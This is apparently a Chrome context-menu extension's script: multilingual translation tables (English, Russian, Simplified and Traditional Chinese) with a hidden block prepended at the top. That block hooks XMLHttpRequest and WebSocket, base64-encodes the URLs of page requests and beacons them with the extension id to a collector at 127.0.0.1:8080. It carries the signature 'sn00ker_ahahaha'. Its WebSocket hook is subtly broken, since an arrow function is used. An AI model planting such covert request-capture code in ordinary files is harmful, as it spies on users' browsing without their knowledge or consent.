function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var LANGUAGE,TRANSLATIONS;LANGUAGE=LANGUAGE||[],LANGUAGE.push("en"),TRANSLATIONS=TRANSLATIONS||{},TRANSLATIONS.en={Notice1:"Important upgrade: enable the new server, repair the cloud storage, menu download, QR code generation, and so on;",i18n:"en","CM summary":"Do the best context menu extension.",zh_CN:"Simplified Chinese",zh_TW:"Traditional Chinese",en:"English",ru:"Russian",Sponsor:"Sponsor author to buy cloud storage server",description:"The extended menu, integrated 300+ function menu and super drag links.",Precaution1:'Undertakes to comply with this app, "Google Chrome Web Store Terms of Service";',Precaution2:"This application is open source software, all source code can be viewed on github;","Super Drag and Drop":"Super Drag and Drop: drag and drop links to the search pages or open, enabled super drag need to install <a href='https://chrome.google.com/webstore/detail/gojgagdabkhlnoeglbklbcebanlfnjkl' target='_blank'> right partner search </a>.","Cloud Storage title":"Save your settings anonymously in the cloud.","Custom title":"User-defined functions menu","error name":"Duplicate names, modify it.","help lin":"Custom URLs using %s indicates that the link URL, for example: https://www.google.com/search?q=link%3A%s","help men":"Custom URLs using %s indicates the current page URL, for example: https://twitter.com/intent/tweet?url=%s","help pic":"Since the by defining URL in the use is %s to the said that image URL, for example,: http://www.google.com/searchbyimage?image_url=%s","help txt":"Enter in the search engine 'SEARCHTEXT', display the results page and copy the full link (including http://) into the input box, and then click the plus sign recognition","Group title":"Multiple functional combinations run together",menMenu:"ContextMenu",txtMenu:"SelectionMenu",picMenu:"ImageMenu",linMenu:"LinkMenu",men:"Context",txt:"Selection",pic:"Image",lin:"Link","men title":"Right-click on the page to display the menu","txt title":"Right-click to select the text display menu","pic title":"Right-click the picture shows the menu","lin title":"Right-click the link to display the menu",c_version:"About Version",c_plugins:"Plug-ins",c_bookmarks:"Bookmark Manager",c_flags:"Flags",c_clearBD:"Clear browsing data",c_settings:"Settings",c_downloads:"Downloads",c_history:"History",c_extensions:"Extensions",c_credits:"Credits",c_appcache:"AppCache Internals",c_memory:"About Memory",chrome:"Chrome Browser",sns:"Social Networking",i_title:"Context Menus Option",all:"Universal","new":"News",ui:"Design",mp3:"Music",comic:"Comic",utils:"Utils",fy:"Translation",qr:"QR for page URL",su:"short URL to clipboard",su_alert:"Create short URL",tab_close:"Close tab",i_custom:"Custom",i_group:"Group",r_del:"Are you sure to delete?",gmail_page:"Send with Gmail",weibo:"Sina microblogging",twitter_men:"Twitter Share",facebook_menu:"Facebook Share",book:"Reading",movie:"Television",shop:"Shopping",baidu:"Baidu.com",bing:"Bing.com",google:"Google.com",duckduckgo:"DuckDuckGo",baidu_site:"Baidu Site Search",google_hk:"Google.hk",google_tw:"Google.tw",en_wikipedia:"Wikipedia en",kd:"China express query",qr_txt:"QR for select text",wikipedia:"Wikipedia zh_CN",ditu:"Google map",ditu_bing:"Bing Ditu",tw_wikipedia:"Wikipedia tw",google_plus:"Google+",gmail_txt:"Send with Gmail",facebook:"Facebook.com",twitter_share:"Twitter Share",twitter:"Twitter.com",bt:"BT search",EDonkey:"EDonkey Search",nds:"Network disk search",youtube:"Youtube.com",google_img:"Google Images",bing_images:"Bing Images",image_baidu:"Baidu Images",scholar:"Google Scholar",wenku:"Baidu Wenku",amazon:"Amazon.cn",Amazon_com:"Amazon.com",translate:"Google Translate",weibo_pic:"Sina microblogging",twitter_pic:"Twitter Share",gmail_pic:"Send with Gmail",facebook_pic:"Facebook Share",su_pic_alert:"short URL for image",su_pic:"image short URL to clipboard",qr_pic:"QR for image",qr_decode:"Parsing images in the QR",google_pic:"Google Images",exif:"Exif viewer",weibo_lin:"Sina microblogging",twitter_lin:"Twitter Share",gmail_lin:"Send with Gmail",facebook_lin:"Facebook Share",google_site:"Google site",google_link:"Google link",bing_site:"Bing site",su_lin_alert:"link Short URL",su_lin:"short URL of the link and copy",qr_lin:"QR for link","phrase help":"Enter the verification phrase(8-30 characters), click <span class='label label-info'> Save Settings </span>, the current configuration will be saved to the cloud. At other times or other machines input validation phrase, click <span class='label label-warning'> Load Settings </span>, all configurations natural recovery. Enter verification phrase <code> cloud demo </code> to be tested. <br/> PS: Before testing, please save your settings oh ^_^"};var LANGUAGE,TRANSLATIONS;LANGUAGE=LANGUAGE||[],LANGUAGE.push("ru"),TRANSLATIONS=TRANSLATIONS||{},TRANSLATIONS.ru={Notice1:"важные обновления: включить новый сервер,ремонт облачного хранения, меню загрузки, QR - код ошибки и т.д.;",i18n:"ru","Context Menus Option":"правой кнопкой Поиск вариантов",zh_CN:"упрощенный китайский",zh_TW:"традиционный китайский",en:"на английском языке",ru:"русский","Context Menus":"правой кнопкой поиск","CM summary":"делать лучшие правой кнопкой меню расширения программы",Sponsor:"спонсорство автор купить облачного хранения сервер",Introduction:"Введение",description:"Расширение контекстного меню , более 300 видов функций, удобный выбор и сочетание или пользовательские страницы , плыви слова , фотографии меню , и создания двумерных кодов , Аналитические функции и Короткие URL . настройки можно использовать облачного хранения . новые функции обмена, увеличение загрузки ресурсов , переименовать и другие функции. правой кнопкой поиск партнера увеличить супер перетаскивания .",Precautions:"Примечание",Precaution1:'обязательство соблюдать положения настоящего приложения Google браузер расширения библиотеки программ условия службы ";',Precaution2:"Это заявление является исходный код программного обеспечения с открытыми исходными кодами , все в github могут просматривать ;",Settings:"Настройки","Advanced settings":"Дополнительные настройки","Language Selection":"язык","QR size":"двухмерный штриховой код размера","Show Edit button":"Показывать кнопки редактирования","Language icon":"язык отображения значка","Open in the background by default":"Открыть в фоновой по умолчанию","Select Short URL Generator Website":"создание веб - сайта выбрать короткий .","Page exists not open a new page":"Страница существует, не открыть новую страницу","Enable Google Analytics":"запуск Google Analytics","Super Drag":"супер - перетаскивания","Top Left":"верхний левый",Front:"портье",Background:"за кулисами",Left:"слева",Right:"справа","Top Right":"на правой",TARGET:"Цели","Bottom Left":"левый нижний","Bottom Right":"Нижний правый","Super Drag and Drop":'Перетащите ссылку в супер - перетащите : страницы поиска или открыть , включите супер - перетащите нужно установить <a href="https://chrome.google.com/webstore/detail/gojgagdabkhlnoeglbklbcebanlfnjkl" target="_blank"> правой кнопкой поиск партнера</a> .',"Cloud Storage":"облачного хранения",Storage:"Сохранить","Show settings":"сохранить настройки отображения , копировать","Read Settings":"читать настройки","Save Settings":"сохранить настройки","Cloud Storage title":"в облаке анонимные сохранить ваши настройки","Verify phrase":"проверки фразы","Load Settings":"Настройки загрузки","The wrong pass phrase":"Ошибка проверки фразы","Are you sure Load Settings?":"Настройки загрузки ли ?",No:"Нет",Yes:"это",Confirm:"подтвердить","Already contained":"уже содержит","Settings string error":"Ошибка настройки данных","Verify phrase 8-30":"проверки ввода фразы ( 8 - 30 символов)","phrase help":'проверки ввода фразы ( 8 - 30 символов) , точка <span class="label label-info"> сохранить настройки </span> , в нынешней конфигурации будет сохранить в облаке. проверки ввода фразы точки <span class="label label-warning"> настройки конфигурации загрузки </span> восстановления , все сразу . может использовать <code>cloud demo</code> испытания. <br/>PS: до испытания , пожалуйста, сначала сохраните ваши настройки О ^_^',About:"О",menMenu:"Страница меню",txtMenu:"подчеркнуть слово меню",picMenu:"фотографии меню",linMenu:"ссылки в меню",men:"страницы",txt:"подчеркнуть слово",pic:"картина",lin:"связь",Menu:"меню",Reviews:"Замечания",Bug:"ошибка",Question:"Проблемы",Feature:"Функции","men title":"щелкните правой кнопкой мыши меню отображения страницы","txt title":"правой кнопкой мыши и выберите текст отображается меню","pic title":"Показывать меню правой кнопкой фотографии","lin title":"Показывать меню правой кнопкой связь",Select:"выбор","Download new menus":"Загрузить новые меню",Download:"Загрузить",Custom:"обычай","Custom title":"Пользовательские меню функция","error name":"Изменить имя повторяю, пожалуйста .","help lin":"Использовать пользовательские . в ссылку URL : %s говорит , например https://www.google.com/search?q=link%3A%s","help men":"Пользовательские URL %s , говорит, что в текущей страницы веб - сайта, например https://twitter.com/intent/tweet?url=%s","help pic":"обычай использовать URL изображения в %s веб - сайт говорит , например : image_http://www.google.com/searchbyimage?url=%s","help txt":'в поисковой системе " поиска введите текст " , показывают результаты после ссылки на страницы , полная копия (в том числе в поле ввода http:// ) , затем нажмите кнопку плюс подтверждения',Group:"сочетание","Group title":"сочетание нескольких функций вместе работает","₪ Back":"₪ за кулисами","₪ Current":"В настоящее время ₪","☢ Private":"☢ стелс",Delete:"Удалить",Share:"обмен",Added:"Добавить",Name:"имя",Type:"тип",URL:"веб - сайт",Count:"число",Points:"интеграл",Multilingual:"многоязычный",Summary:"Введение",Author:"автор",Close:"закрыть","Server Error":"ошибка сервера",Alert:"подсказки",Error:"ошибка","Shared success":"Доля успеха",Edit:"редактор",Save:"Сохранить","Save success":"сохранён","Delete success":"Удалить успеха","Are you sure delete this menu?":"уверены, что хотите удалить это меню ?",c_version:"о версии",c_plugins:"плагин",c_bookmarks:"Менеджер монтирования",c_flags:"лаборатория",c_clearBD:"Очистить просмотр данных",c_settings:"Настройки",c_downloads:"Загрузить содержание",c_history:"исторические записи",c_extensions:"расширение программы",c_credits:"автор",c_appcache:"применение кэширования",c_memory:"память",chrome:"браузер Chrome",sns:"веб - сайты социальных сетей",fy:"перевод",i_title:"правой кнопкой Поиск вариантов",all:"универсальный","new":"новости",ui:"дизайн",mp3:"музыка",comic:"комикс",utils:"инструменты",qr:"В настоящее время QR - Код генерации .",su:"создать страницу Короткие URL и копировать",su_alert:"создать страницу короткий .",tab_close:"закрыть страницу",r_del:"Вы уверены, что удалить ?",gmail_page:"Gmail отправки",qzone:"Пространство разделяют на qq",weibo:"Сина 微博",twitter_men:"Twitter поделиться",facebook_menu:"поделиться в Facebook",book:"чтение",movie:"кино",shop:"торговый",baidu:"Baidu",bing:"Bing.com",google:"Google.com",duckduckgo:"Duckduckgo",baidu_site:"службы поиска Baidu",google_hk:"Google.hk",google_tw:"Google.tw",en_wikipedia:"Английская Википедия",kd:"экспресс - один запрос",qr_txt:"Выберите 2d Код генерации текста",wikipedia:"упрощенный Википедия",ditu:"Карты Google",ditu_bing:"Bing карты",tw_wikipedia:"традиционный Википедия",google_plus:"Google+",gmail_txt:"Gmail отправки",facebook:"Facebook.com",twitter_share:"Twitter поделиться",twitter:"Twitter.com",youtube:"Youtube.com",thepiratebay:"Pirate Bay",google_img:"Google фотографии",bing_images:"Bing фотографии",image_baidu:"Baidu фотографии",scholar:"Академия Google",wenku:"Baidu библиотека",amazon:"Amazon Китая",Amazon_com:"Amazon",translate:"Google перевод",weibo_pic:"Сина 微博",twitter_pic:"Twitter поделиться",gmail_pic:"Gmail отправки",facebook_pic:"поделиться в Facebook",su_pic_alert:"создать картину короткий .",su_pic:"создать картину Короткие URL и копировать",qr_pic:"В настоящее время фотографии поколения двухмерные коды",qr_decode:"в аналитических фотографии двух код",google_pic:"Google фотографии",exif:"просмотреть фотографии информации",weibo_lin:"Сина 微博",twitter_lin:"Twitter поделиться",gmail_lin:"Gmail отправки",facebook_lin:"поделиться в Facebook",google_site:"Сайты Google",google_link:"Google ссылки",bing_site:"Bing веб - сайт",su_lin_alert:"Создать ссылку короткий .",su_lin:"Создать ссылку URL и копировать короткий",qr_lin:"В настоящее время связь создания двумерных кодов"};var LANGUAGE,TRANSLATIONS;LANGUAGE=LANGUAGE||[],LANGUAGE.push("zh_CN"),TRANSLATIONS=TRANSLATIONS||{},TRANSLATIONS.zh_CN={Notice1:"重要升级:启用新云服务器,修复云存储,菜单下载,QR码生成等错误;",i18n:"cn","Context Menus Option":"右键搜 - 选项",zh_CN:"简体中文",zh_TW:"繁体中文",en:"英文",ru:"俄文","Context Menus":"右键搜","CM summary":"做最优秀的右键菜单扩展程序",Sponsor:"赞助作者购买云存储服务器",Introduction:"介绍",description:"扩展右键菜单，超过300种功能，方便的选择、组合或自定义页面、划词、图片菜单，并有生成、解析二维码和短网址功能。设置可使用云存储。最新增加功能共享、资源下载、重命名等功能。右键搜伴侣增加超级拖拽。",Precautions:"注意事项",Precaution1:"本应用承诺遵守《谷歌浏览器扩展程序库服务条款》；",Precaution2:"本应用是开源软件，所有源码均可在github上查看；",Settings:"设置","Advanced settings":"高级设置","Language Selection":"语言选择","QR size":"二维码尺寸","Show Edit button":"显示编辑按钮","Language icon":"显示语言图标","Open in the background by default":"默认后台打开","Select Short URL Generator Website":"选择短网址生成网站","Page exists not open a new page":"页面存在则不打开新页面","Enable Google Analytics":"启动Google Analytics","Super Drag":"超级拖拽","Top Left":"左上",Front:"前台",Background:"后台",Left:"左侧",Right:"右侧","Top Right":"右上",TARGET:"目标","Bottom Left":"左下","Bottom Right":"右下","Super Drag and Drop":'超级拖拽: 网页中拖拽链接则搜索或打开，启用超级拖拽需要安装<a href="https://chrome.google.com/webstore/detail/gojgagdabkhlnoeglbklbcebanlfnjkl" target="_blank">右键搜伴侣</a>。',"Cloud Storage":"云存储",Storage:"保存","Show settings":"显示设置，复制保存","Read Settings":"读取设置","Save Settings":"保存设置","Cloud Storage title":"在云中匿名保存您的设置","Verify phrase":"验证短语","Load Settings":"加载设置","The wrong pass phrase":"错误的验证短语","Are you sure Load Settings?":"是否加载设置?",No:"否",Yes:"是",Confirm:"确认","Already contained":"已经包含","Settings string error":"设置数据错误","Verify phrase 8-30":"输入验证短语(8-30字符)","phrase help":"输入验证短语(8-30字符)，点<span class='label label-info'>保存设置</span>，当前配置将保存到云端。输入验证短语点<span class='label label-warning'>加载设置</span>，所有配置立刻恢复。可使用<code>cloud demo</code>测试。<br/>PS: 测试前，请先保存您的设置哦^_^",About:"关于",menMenu:"页面菜单",txtMenu:"划词菜单",picMenu:"图片菜单",linMenu:"链接菜单",men:"页面",txt:"划词",pic:"图片",lin:"链接",Menu:"菜单",Reviews:"评论",Bug:"错误",Question:"问题",Feature:"功能","men title":"右击页面显示的菜单","txt title":"右键选择文字显示的菜单","pic title":"右键图片显示的菜单","lin title":"右键链接显示的菜单","Language Selection":"语言",Select:"选择","Download new menus":"下载新菜单",Download:"下载",Custom:"自定义","Custom title":"用户自定义功能菜单","error name":"名称重复，请修改。","help lin":"自定义网址中使用%s表示链接网址，例如: https://www.google.com/search?q=link%3A%s","help men":"自定义网址中使用%s表示当前页面网址，例如: https://twitter.com/intent/tweet?url=%s","help pic":"自定义网址中使用%s表示图片网址，例如: http://www.google.com/searchbyimage?image_url=%s","help txt":"在搜索引擎中输入“搜索文字”，显示结果页面后复制完整的链接(包括http://)到输入框，然后点击加号确认",Group:"组合","Group title":"多个功能组合一起运行","₪ Back":"₪ 后台","₪ Current":"₪ 当前","☢ Private":"☢ 隐身",Delete:"删除",Share:"共享",Added:"新增",Name:"名称",Type:"分类",Type:"类型",URL:"网址",Count:"次数",Points:"积分",Multilingual:"多国语言",Summary:"简介",Author:"作者",Close:"关闭","Server Error":"服务器错误",Alert:"提示",Error:"错误","Shared success":"共享成功",Edit:"编辑",Save:"保存","Save success":"保存成功","Delete success":"删除成功","Are you sure delete this menu?":"确定要删除这个菜单?",c_version:"关于版本",c_plugins:"插件",c_bookmarks:"书签管理器",c_flags:"实验室",c_clearBD:"清除浏览数据",c_settings:"设置",c_downloads:"下载内容",c_history:"历史记录",c_extensions:"扩展程序",c_credits:"作者",c_appcache:"应用缓存",c_memory:"内存",chrome:"Chrome 浏览器",sns:"社交网站",fy:"翻译",i_title:"右键搜 选项",all:"通用","new":"新闻",ui:"设计",mp3:"音乐",comic:"漫画",utils:"工具",qr:"生成当前网址二维码",su:"创建页面短网址并复制",su_alert:"创建页面短网址",tab_close:"关闭页面",r_del:"是否确定删除?",gmail_page:"Gmail发送",qzone:"分享到QQ空间",weibo:"新浪微博",twitter_men:"Twitter 分享",facebook_menu:"Facebook分享",book:"阅读",movie:"影视",shop:"购物",baidu:"百度",bing:"Bing.com",google:"Google.com",duckduckgo:"DuckDuckGo",baidu_site:"百度站内搜",google_hk:"Google.hk",google_tw:"Google.tw",en_wikipedia:"英文维基百科",kd:"快递单查询",qr_txt:"选择文字生成二维码",wikipedia:"简体维基百科",ditu:"Google地图",ditu_bing:"Bing地图",tw_wikipedia:"繁体维基百科",google_plus:"Google+",gmail_txt:"Gmail发送",facebook:"Facebook.com",twitter_share:"Twitter 分享",twitter:"Twitter.com",youtube:"Youtube.com",thepiratebay:"海盗湾",google_img:"Google图片",bing_images:"Bing图片",image_baidu:"百度图片",scholar:"Google学术",wenku:"百度文库",amazon:"亚马逊中国",Amazon_com:"亚马逊",translate:"Google翻译","Baidu fanyi":"百度翻译",weibo_pic:"新浪微博",twitter_pic:"Twitter 分享",gmail_pic:"Gmail发送",facebook_pic:"Facebook分享",su_pic_alert:"创建图片短网址",su_pic:"创建图片短网址并复制",qr_pic:"当前图片生成二维码",qr_decode:"解析图片中的二维码",google_pic:"Google图片",exif:"图片信息查看",weibo_lin:"新浪微博",twitter_lin:"Twitter 分享",gmail_lin:"Gmail发送",facebook_lin:"Facebook分享",google_site:"谷歌网站",google_link:"谷歌链接",bing_site:"Bing网站",su_lin_alert:"创建链接短网址",su_lin:"创建链接短网址并复制",qr_lin:"当前链接生成二维码"};var LANGUAGE,TRANSLATIONS;LANGUAGE=LANGUAGE||[],LANGUAGE.push("zh_TW"),TRANSLATIONS=TRANSLATIONS||{},TRANSLATIONS.zh_TW={Notice1:"重要陞級：啟用新服務器，修復雲存儲，選單下載，QR碼生成等錯誤；",i18n:"tw","Context Menus Option":"右鍵搜-選項",zh_CN:"簡體中文",zh_TW:"正體中文",en:"英文",ru:"俄文","Context Menus":"右鍵搜","CM summary":"做最優秀的右鍵菜單擴展程式",Sponsor:"贊助作者購買雲存儲服務器",Introduction:"介紹",description:"擴展右鍵菜單，超過300種功能，方便的選擇、組合或自定義頁面、劃詞、圖片選單，並有生成、解析二維碼和短網址功能。設定可使用雲存儲。最新新增功能共亯、資源下載、重命名等功能。右鍵搜伴侶新增超級拖拽。",Precautions:"注意事項",Precaution1:"本應用承諾遵守《穀歌瀏覽器擴展程序庫服務條款》；",Precaution2:"本應用是開源軟件，所有源碼均可在github上查看；",Settings:"設定","Advanced settings":"高級設定","Language Selection":"語言選擇","QR size":"二維碼尺寸","Show Edit button":"顯示編輯按鈕","Language icon":"顯示語言圖標","Open in the background by default":"默認後臺打開","Select Short URL Generator Website":"選擇短網址生成網站","Page exists not open a new page":"頁面存在則不打開新頁面","Enable Google Analytics":"啟動Google Analytics","Super Drag":"超級拖拽","Top Left":"左上",Front:"前臺",Background:"後臺",Left:"左側",Right:"右側","Top Right":"右上",TARGET:"目標","Bottom Left":"左下","Bottom Right":"右下","Super Drag and Drop":'超級拖拽:網頁中拖拽連結則蒐索或打開，啟用超級拖拽需要安裝<a href="https://chrome.google.com/webstore/detail/gojgagdabkhlnoeglbklbcebanlfnjkl" target="_blank">右鍵搜伴侶</a>。',"Cloud Storage":"雲存儲",Storage:"保存","Show settings":"顯示設定，複製保存","Read Settings":"讀取設定","Save Settings":"保存設置","Cloud Storage title":"在雲中匿名保存您的設定","Verify phrase":"驗證短語","Load Settings":"加載設定","The wrong pass phrase":"錯誤的驗證短語","Are you sure Load Settings?":"是否加載設定？",No:"否",Yes:"是",Confirm:"確認","Already contained":"已經包含","Settings string error":"設定數據錯誤","Verify phrase 8-30":"輸入驗證短語（8-30字元）","phrase help":"輸入驗證短語（8-30字元），點<span class='label label-info'>保存設置</span>，當前配寘將保存到雲端。輸入驗證短語點<span class='label label-warning'>加載設定</span>，所有配寘立刻恢復。可使用<code>cloud demo</code>測試。<br/>PS:測試前，請先保存您的設定哦^_^",About:"關於",menMenu:"頁面選單",txtMenu:"劃詞選單",picMenu:"圖片選單",linMenu:"連結選單",men:"頁面",txt:"劃詞",pic:"圖片",lin:"連結",Menu:"選單",Reviews:"評論",Bug:"錯誤",Question:"問題",Feature:"功能","men title":"右擊頁面顯示的選單","txt title":"右鍵選擇文字顯示的選單","pic title":"右鍵圖片顯示的選單","lin title":"右鍵連結顯示的選單","Language Selection":"語言",Select:"選擇","Download new menus":"下載新選單",Download:"下載",Custom:"自定義","Custom title":"用戶自定義功能選單","error name":"名稱重複，請修改。","help lin":"自定義網址中使用%s表示連結網址，例如:https://www.google.com/search?q=link%3A%s","help men":"自定義網址中使用%s表示當前頁面網址，例如:https://twitter.com/intent/tweet?url=%s","help pic":"自定義網址中使用%s表示圖片網址，例如:http://www.google.com/searchbyimage?image_url=%s","help txt":"在搜尋引擎中輸入“SEARCHTEXT”，顯示結果頁面後複製完整的連結（包括http://）到輸入框，然後點擊加號確認",Group:"組合","Group title":"多個功能組合一起運行","₪Back":"₪後臺","₪Current":"₪當前","☢Private":"☢隱身",Delete:"删除",Share:"共亯",Added:"新增",Name:"名稱",Type:"分類",Type:"類型",URL:"網址",Count:"次數",Points:"積分",Multilingual:"多國語言",Summary:"簡介",Author:"作者",Close:"關閉","Server Error":"服務器錯誤",Alert:"提示",Error:"錯誤","Shared success":"共亯成功",Edit:"編輯",Save:"保存","Save success":"保存成功","Delete success":"删除成功","Are you sure delete this menu?":"確定要删除這個選單？",c_version:"關於版本",c_plugins:"挿件",c_bookmarks:"書簽管理器",c_flags:"實驗室",c_clearBD:"清除瀏覽數據",c_settings:"設定",c_downloads:"下載內容",c_history:"歷史記錄",c_extensions:"擴展程式",c_credits:"作者",c_appcache:"應用緩存",c_memory:"記憶體",chrome:"Chrome瀏覽器",sns:"社交網站",fy:"翻譯",i_title:"右鍵搜選項",all:"通用","new":"新聞",ui:"設計",mp3:"音樂",comic:"漫畫",utils:"工具",qr:"生成當前網址二維碼",su:"創建頁面短網址並複製",su_alert:"創建頁面短網址",tab_close:"關閉頁面",r_del:"是否確定删除？",gmail_page:"Gmail發送",qzone:"分享到QQ空間",weibo:"新浪微博",twitter_men:"Twitter分享",facebook_menu:"Facebook分享",book:"閱讀",movie:"影視",shop:"購物",baidu:"百度",bing:"Bing.com",google:"Google.com",duckduckgo:"DuckDuckGo",baidu_site:"百度站內搜",google_hk:"Google.hk",google_tw:"Google.tw",en_wikipedia:"英文維琪百科",kd:"快遞單査詢",qr_txt:"選擇文字生成二維碼",wikipedia:"簡體維琪百科",ditu:"Google地圖",ditu_bing:"Bing地圖",tw_wikipedia:"繁體維琪百科",google_plus:"Google+",gmail_txt:"Gmail發送",facebook:"Facebook.com",twitter_share:"Twitter分享",twitter:"Twitter.com",youtube:"Youtube.com",thepiratebay:"海盜灣",google_img:"Google圖片",bing_images:"Bing圖片",image_baidu:"百度圖片",scholar:"Google學術",wenku:"百度文庫",amazon:"亞馬遜中國",Amazon_com:"亞馬遜",translate:"Google翻譯",weibo_pic:"新浪微博",twitter_pic:"Twitter分享",gmail_pic:"Gmail發送",facebook_pic:"Facebook分享",su_pic_alert:"創建圖片短網址",su_pic:"創建圖片短網址並複製",qr_pic:"當前圖片生成二維碼",qr_decode:"解析圖片中的二維碼",google_pic:"Google圖片",exif:"圖片資訊查看",weibo_lin:"新浪微博",twitter_lin:"Twitter分享",gmail_lin:"Gmail發送",facebook_lin:"Facebook分享",google_site:"穀歌網站",google_link:"穀歌連結",bing_site:"Bing網站",su_lin_alert:"創建連結短網址",su_lin:"創建連結短網址並複製",qr_lin:"當前連結生成二維碼"};